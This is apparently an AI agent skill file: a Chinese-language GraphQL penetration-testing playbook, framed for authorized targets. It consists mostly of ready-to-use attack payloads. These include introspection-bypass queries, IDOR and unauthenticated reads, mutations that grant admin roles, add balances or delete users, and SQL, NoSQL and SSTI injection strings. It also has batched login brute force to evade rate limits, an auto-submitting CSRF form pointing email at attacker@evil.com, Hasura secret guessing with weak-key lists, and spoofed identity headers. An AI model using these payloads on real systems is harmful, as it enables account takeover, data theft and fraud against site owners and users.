---
name: 星念
description: >-
 GraphQL 完整渗透手法：introspection 枚举、未授权查询/变更、
 IDOR via 直接对象 ID、批量注入攻击、SQL/NoSQL/SSTI 注入、
 CSRF via JSON、Authorization Bypass、字段级权限绕过、
 Hasura/Relay/Apollo 专项。
 GitLab GraphQL 专项走 gitlab-graphql-unauth；JWT 走 jwt-bypass-pentest。
version: 1.0.0
---

> **星宿**
> 一生不利己，忧济在元元。
> 捐躯赴难死，星光照人间。
> 三百万年转瞬封，半为天意半为空。
> 算尽天下穷心力，逆转宿命显神通！

# GraphQL 渗透完整手法

**前提**：目标在 `授权范围`。

---

## 快速入口

```bash
# 摸面 + introspection
python3 炼蛊房/jwt_gql_probe.py -u https://授权站 --case <案卷>
# 已确认端点：未授权读 / 换 id / batch
python3 炼蛊房/gql_authz_probe.py introspect --url https://授权/graphql --case <案>
python3 炼蛊房/gql_authz_probe.py swap --url https://授权/graphql \
  --query '{ user(id:1){id email} }' --ids 1,2 --header 'Authorization: Bearer <票>' --case <案>
```

作业手法：`传承/星念.md`。GitLab 走 `gitlab-graphql-unauth`。

---

## §1 发现端点

```bash
# 常见路径
curl -s https://授权站/graphql
curl -s https://授权站/api/graphql
curl -s https://授权站/v1/graphql
curl -s https://授权站/query
curl -s https://授权站/gql

# 特征：Content-Type: application/json，body 含 query 字段
# 或响应含 "__typename" 字段

# 判断是否开启 GraphiQL IDE
curl -s https://授权站/graphql -H "Accept: text/html" | grep -i graphiql
```

---

## §2 Introspection 完整枚举

```bash
# 标准 introspection query（一次拉所有类型和字段）
curl -s https://授权站/graphql \
 -H "Content-Type: application/json" \
 -H "Authorization: Bearer $TOKEN" \
 -d '{"query":"{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name kind}}}}}}"}'

# 用 graphql-introspection-gen 格式化
pip install graphql-core
python3 -c "
import json, sys
schema = json.loads(open('schema.json').read())['data']['__schema']
for t in schema['types']:
 if not t['name'].startswith('__') and t['fields']:
 print(f\"type {t['name']}:\")
 for f in t['fields']:
 print(f\" {f['name']}: {f['type']['name'] or f['type']['kind']}\")
"

# InQL (Burp 插件) 自动生成所有 query/mutation 模板
# https://github.com/doyensec/inql

# 获取敏感类型清单（优先测）
# User/Account/Admin/Payment/Order/Token/Config/Secret/Key
```

---

## §3 绕过 Introspection 禁用

```graphql
# 方法 1: 换行符绕过（服务端正则只禁 __schema 单行）
{"query": "{\n__schema\n{queryType{name}}}"}

# 方法 2: fragment 绕过
{"query": "fragment s on __Schema{queryType{name}} {__schema{...s}}"}

# 方法 3: 字段建议（不需 introspection）
# 发错误的字段名，服务端常提示 "Did you mean X?"
{"query": "{user{passwrd}}"} → "Did you mean 'password'?"

# 方法 4: 暴力枚举常见字段名（clairvoyance 工具）
pip install clairvoyance
clairvoyance https://授权站/graphql -o schema.json -H "Authorization: Bearer $TOKEN"
```

---

## §4 未授权查询（认证绕过）

```graphql
# 尝试不带 token 执行查询
{"query": "{ users { id email role } }"}
{"query": "{ me { id email phoneNumber balance } }"}
{"query": "{ orders(first: 10) { id amount status userId } }"}

# IDOR - 直接用 ID 访问他人对象
{"query": "{ user(id: \"2\") { id email phoneNumber } }"}
{"query": "{ order(id: 1001) { id amount items { price } } }"}

# 批量 IDOR（alias 并发）
{"query": "{
 u1: user(id: 1) { id email }
 u2: user(id: 2) { id email }
 u3: user(id: 3) { id email }
}"}
```

---

## §5 Mutation 越权

```graphql
# 低权用户执行管理员变更
{"query": "mutation { updateUserRole(id: \"1\", role: \"admin\") { success } }"}
{"query": "mutation { deleteUser(id: \"2\") { success } }"}
{"query": "mutation { addBalance(userId: \"1\", amount: 10000) { balance } }"}

# 绕过身份验证创建管理员
{"query": "mutation { createUser(email:\"hacker@test.com\",password:\"pass\",role:\"admin\") { id token } }"}

# 密码重置不验证身份
{"query": "mutation { resetPassword(email:\"victim@site.com\") { message } }"}
{"query": "mutation { confirmPasswordReset(token:\"GUESS\",newPassword:\"pwned\") { success } }"}
```

---

## §6 注入攻击

### SQL 注入

```graphql
# 过滤条件注入
{"query": "{ users(filter: \"1=1\") { id email } }"}
{"query": "{ users(name: \"admin' OR 1=1--\") { id email password } }"}
{"query": "{ search(query: \"' UNION SELECT 1,username,password FROM users--\") { results } }"}
```

### NoSQL 注入

```graphql
# MongoDB 操作符
{"query": "{ users(filter: {password: {\"$ne\": null}}) { id email } }"}
{"query": "{ login(username: \"admin\", password: {\"$gt\": \"\"}) { token } }"}
```

### SSTI

```graphql
{"query": "{ render(template: \"{{7*7}}\") { output } }"}
{"query": "{ sendEmail(subject: \"{{config}}\") { success } }"}
```

---

## §7 批量查询攻击（Batching Attack）

```bash
# 批量暴力破解（绕过单次速率限制）
curl -s https://授权站/graphql \
 -H "Content-Type: application/json" \
 -d '[
 {"query":"mutation{login(username:\"admin\",password:\"pass1\"){token}}"},
 {"query":"mutation{login(username:\"admin\",password:\"pass2\"){token}}"},
 {"query":"mutation{login(username:\"admin\",password:\"pass3\"){token}}"},
 {"query":"mutation{login(username:\"admin\",password:\"admin\"){token}}"},
 {"query":"mutation{login(username:\"admin\",password:\"123456\"){token}}"}
 ]'

# 同样适用于 OTP/验证码枚举
# 一个请求发送 1000 个 query，绕过每请求限制
```

---

## §8 字段级权限绕过

```graphql
# 尝试读取隐藏字段（文档中可能未列出）
{"query": "{ me { id email password secretKey apiToken internalNotes } }"}

# Fragment 绕过权限检查
{"query": "fragment AdminFields on User { password secretKey } query { me { ...AdminFields } }"}

# 别名覆盖（绕过字段黑名单）
{"query": "{ me { p: password s: secretKey a: apiToken } }"}
```

---

## §9 CSRF via GraphQL

```html
<!-- 服务端不验证 Origin 时，POST JSON 可 CSRF -->
<form method="POST" action="https://授权站/graphql"
 enctype="text/plain">
 <input name='{"query":"mutation{changeEmail(email:\"attacker@evil.com\")
 {success}}","x":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

---

## §10 Hasura 专项

```bash
# Hasura 默认开启 introspection 且常用 x-hasura-admin-secret 头
curl https://授权站/v1/graphql \
 -H "x-hasura-admin-secret: GUESS_OR_LEAKED_SECRET" \
 -d '{"query":"{__schema{types{name}}}"}'

# 常见弱密钥
# myadminsecretkey hasura123 secret admin changeme

# 未鉴权角色 anonymous 可读
curl https://授权站/v1/graphql \
 -H "x-hasura-role: anonymous" \
 -d '{"query":"{ users { id email } }"}'

# 通过 x-hasura-user-id 伪造身份
curl https://授权站/v1/graphql \
 -H "x-hasura-role: user" \
 -H "x-hasura-user-id: 1" \
 -d '{"query":"{ me { id email apiKey } }"}'
```

---

## §11 GraphQL 订阅（WebSocket）越权

```javascript
const wsClient = new WebSocket('wss://授权站/graphql', 'graphql-ws');
wsClient.onopen = () => {
 // 不带 token 订阅管理员事件
 wsClient.send(JSON.stringify({
 type: 'subscribe',
 id: '1',
 payload: {
 query: 'subscription { adminEvents { userId action data } }'
 }
 }));
};
wsClient.onmessage = e => console.log(e.data);
```

---

## §12 工具链

```bash
# graphw00f - 指纹识别
pip install graphw00f
graphw00f -f -t https://授权站/graphql

# graphql-cop - 安全审计
pip install graphql-cop
graphql-cop -t https://授权站/graphql -H "Authorization:Bearer $TOKEN"

# graphql-path-enum - 路径枚举
git clone https://github.com/nicholasess/graphql-path-enum

# altair / playground 图形客户端测试
```

---

## 成功口径

| 档 | 条件 |
|----|------|
| L1 | introspection 开启 + 类型/字段枚举 |
| L2 | 未授权数据读取 / IDOR 成功 |
| L3 | mutation 越权（加款/改角色/删用户）|

---

## 真源

- 手法：`传承/星念.md` · `传承/李代桃僵·星念.md`
- 工具：`python3 炼蛊房/gql_authz_probe.py --help`
- 摸面：`python3 炼蛊房/jwt_gql_probe.py --help`
